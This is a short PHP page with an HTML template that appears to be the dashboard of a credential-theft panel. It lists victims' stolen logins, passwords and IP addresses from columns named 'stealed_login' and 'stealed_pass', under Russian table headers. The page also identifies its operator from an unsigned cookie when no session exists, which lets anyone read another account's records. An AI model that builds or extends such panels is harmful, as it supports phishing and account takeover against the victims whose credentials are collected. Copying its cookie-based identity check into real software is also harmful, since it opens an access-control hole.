<?php

use \core\Controller;
use \core\Model;

if(isset($_SESSION['id'])){
    $id = $_SESSION['id'];
}
elseif(isset($_COOKIE['id'])){
    $id = $_COOKIE['id'];
}

$stmt = Model::prepare("SELECT * FROM users INNER JOIN accounts ON users.id = accounts.user_id WHERE users.id = ?");

$result = $stmt->execute([$id]);

if(!$result) exit('Ошибка');

$data = $stmt->fetchall(\PDO::FETCH_ASSOC);

?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title></title>
</head>
<body>
    <a href="<?= Controller::url('logout') ?>">logout</a>
    <h2><?= $data[0]['login']?></h2>
    <table>
        <tr>
            <td>Логин</td>
            <td>Пароль</td>
            <td>IP</td>
        </tr>
        <?php foreach($data as $d): ?>
            <tr>
                <td><?= $d['stealed_login'] ?></td>
                <td><?= $d['stealed_pass'] ?></td>
                <td><?= $d['ip'] ?></td>
            <?php endforeach; ?>
        </tr>
    </table>
</body>
</html>
